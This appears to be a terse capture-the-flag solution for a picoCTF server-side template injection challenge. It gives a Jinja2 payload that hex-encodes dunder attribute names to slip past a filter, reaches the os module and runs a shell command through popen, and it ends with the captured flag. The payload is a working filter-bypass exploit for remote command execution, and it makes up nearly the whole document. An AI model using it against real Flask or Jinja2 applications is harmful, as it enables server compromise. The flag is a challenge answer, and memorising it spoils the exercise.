attack payload
```
{{ config |attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f') |attr('\x5f\x5f\x69\x6e\x69\x74\x5f\x5f') |attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f') |attr('get')('os') |attr('popen')('head flag') |attr('read')() }}
```

flag
```
picoCTF{sst1_f1lt3r_byp4ss_060a5eb0}
```